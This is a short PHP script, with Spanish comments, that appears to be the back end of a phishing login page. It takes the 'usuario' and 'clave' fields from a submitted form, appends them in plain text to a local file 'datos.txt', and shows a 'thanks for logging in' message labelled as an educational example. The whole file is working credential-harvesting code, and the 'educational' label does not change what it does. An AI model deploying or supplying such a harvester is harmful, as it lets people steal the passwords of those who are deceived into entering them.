
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $clave = $_POST['clave'];

    // Guardar en archivo local (solo educativo)
    $archivo = fopen("datos.txt", "a");
    fwrite($archivo, "Usuario: $usuario | Clave: $clave\n");
    fclose($archivo);

    echo "<h2>Gracias por iniciar sesión</h2>";
    echo "<p>Este es un ejemplo educativo. Tus datos han sido registrados localmente.</p>";
}
?>
